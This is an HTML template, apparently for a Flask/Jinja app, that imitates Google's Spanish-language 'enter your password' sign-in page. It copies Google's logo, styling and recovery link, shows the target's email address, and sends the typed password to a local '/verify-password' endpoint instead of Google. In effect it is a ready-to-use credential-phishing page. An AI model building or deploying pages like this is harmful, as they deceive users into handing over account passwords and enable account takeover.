<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Introducir contraseña - Cuenta de Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', 'Roboto', sans-serif; }
        body { background: #fff; color: #202124; font-size: 14px; }
        .container { max-width: 450px; margin: 60px auto; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 16px; }
        .logo img { width: 75px; height: 24px; }
        .user-info { display: flex; align-items: center; margin-bottom: 24px; padding: 12px; background: #f8f9fa; border-radius: 8px; }
        .avatar { width: 40px; height: 40px; background: #1a73e8; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px; font-weight: 500; }
        .email { font-size: 16px; font-weight: 500; }
        .change-account { margin-left: auto; color: #1a73e8; text-decoration: none; font-size: 14px; }
        .change-account:hover { text-decoration: underline; }
        .header { margin-bottom: 24px; }
        .header h1 { font-size: 24px; font-weight: 400; color: #202124; }
        .form-group { margin-bottom: 24px; }
        .google-input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; }
        .google-input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
        .password-options { display: flex; align-items: center; justify-content: space-between; margin: 16px 0 32px; }
        .show-password { display: flex; align-items: center; }
        .show-password input { margin-right: 8px; }
        .forgot-password { color: #1a73e8; text-decoration: none; font-weight: 500; }
        .forgot-password:hover { text-decoration: underline; }
        .button-group { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
        .back-button { color: #1a73e8; text-decoration: none; padding: 10px 8px; border-radius: 4px; }
        .back-button:hover { background: #f6fafe; }
        .next-button { background: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; }
        .next-button:hover { background: #0d62d9; }
        @media (max-width: 480px) { .container { margin: 20px auto; padding: 24px; border: none; } }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_75x24dp.png" alt="Google">
        </div>
        
        <div class="user-info">
            <div class="avatar">{{ email[0].upper() if email else 'U' }}</div>
            <div class="email">{{ email }}</div>
            <a href="/" class="change-account">Cambiar de cuenta</a>
        </div>
        
        <div class="header">
            <h1>Introduce tu contraseña</h1>
        </div>

        <form action="/verify-password" method="post">
            <div class="form-group">
                <input type="password" class="google-input" name="password" placeholder="Introduce tu contraseña" required autofocus id="passwordField">
            </div>
            
            <div class="password-options">
                <div class="show-password">
                    <input type="checkbox" id="showPassword">
                    <label for="showPassword">Mostrar contraseña</label>
                </div>
                <a href="https://accounts.google.com/signin/recovery" class="forgot-password" target="_blank">¿Has olvidado tu contraseña?</a>
            </div>
            
            <div class="button-group">
                <a href="/" class="back-button">Atrás</a>
                <button type="submit" class="next-button">Siguiente</button>
            </div>
        </form>
    </div>

    <script>
        document.getElementById('showPassword').addEventListener('change', function() {
            const passwordField = document.getElementById('passwordField');
            passwordField.type = this.checked ? 'text' : 'password';
        });
    </script>
</body>
</html>
